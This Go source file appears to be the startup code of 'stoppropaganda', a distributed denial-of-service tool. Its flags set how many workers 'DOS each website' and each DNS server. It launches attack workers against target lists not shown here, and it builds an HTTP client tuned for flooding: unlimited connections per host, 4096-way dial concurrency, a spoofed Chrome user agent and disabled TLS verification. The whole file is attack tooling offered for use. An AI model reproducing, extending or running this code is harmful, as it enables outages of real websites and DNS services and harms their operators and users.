package stoppropaganda

import (
	"crypto/tls"
	"flag"
	"log"
	"math"
	"math/rand"
	"os"
	"sync"
	"time"

	"github.com/peterbourgon/ff/v3"
	"github.com/valyala/fasthttp"
)

var fs = flag.NewFlagSet("stoppropaganda", flag.ExitOnError)
var (
	flagBind       = fs.String("bind", ":8049", "bind on specific host:port")
	flagWorkers    = fs.Int("workers", 20, "DOS each website with this amount of workers")
	flagTimeout    = fs.Duration("timeout", 10*time.Second, "timeout of HTTP request")
	flagDNSWorkers = fs.Int("dnsworkers", 100, "DOS each DNS server with this amount of workers")
	flagDNSTimeout = fs.Duration("dnstimeout", 125*time.Millisecond, "timeout of DNS request")
	flagUserAgent  = fs.String("useragent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "User agent used in HTTP requests")
)

func Start() {
	ff.Parse(fs, os.Args[1:], ff.WithEnvVarPrefix("SP"))

	for dnsServer := range targetDNS {
		dnsServers[dnsServer] = &DNSServer{mux: &sync.Mutex{}}
		dnsServers[dnsServer].Start(dnsServer)
	}

	for link := range targetWebsites {
		websites[link] = &Website{mux: &sync.Mutex{}}
		websites[link].Start(link)
	}

	log.Println("Started!")
	panic(fasthttp.ListenAndServe(*flagBind, fasthttpRequestHandler))
}

var httpClient *fasthttp.Client

func init() {
	rand.Seed(time.Now().UnixNano())

	httpClient = &fasthttp.Client{
		ReadTimeout:                   *flagTimeout,
		WriteTimeout:                  *flagTimeout,
		MaxIdleConnDuration:           time.Hour,
		NoDefaultUserAgentHeader:      true,
		DisableHeaderNamesNormalizing: true,
		DisablePathNormalizing:        true,
		MaxConnsPerHost:               math.MaxInt,
		Dial: (&fasthttp.TCPDialer{
			Concurrency:      4096,
			DNSCacheDuration: 5 * time.Minute,
		}).Dial,
		TLSConfig: &tls.Config{InsecureSkipVerify: true},
	}
}
